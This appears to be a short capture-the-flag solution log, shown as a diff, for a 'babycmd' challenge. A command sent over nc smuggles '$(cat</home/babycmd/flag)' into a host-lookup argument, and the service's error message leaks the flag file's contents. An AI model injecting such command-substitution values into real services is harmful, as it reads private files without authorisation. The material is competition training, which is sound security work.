@@ -1,0 +1,8 @@
+$ echo -e 'host a.$(cat</home/babycmd/flag).de\nexit\n' | nc babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me 15491
+
+
+Welcome to another Baby's First Challenge!
+Commands: ping, dig, host, exit
+: host: 'a.The flag is: Pretty easy eh!!~ Now let's try something hArd3r, shallwe??.de' is not a legal name (label too long)
+Commands: ping, dig, host, exit
+: Goodbye
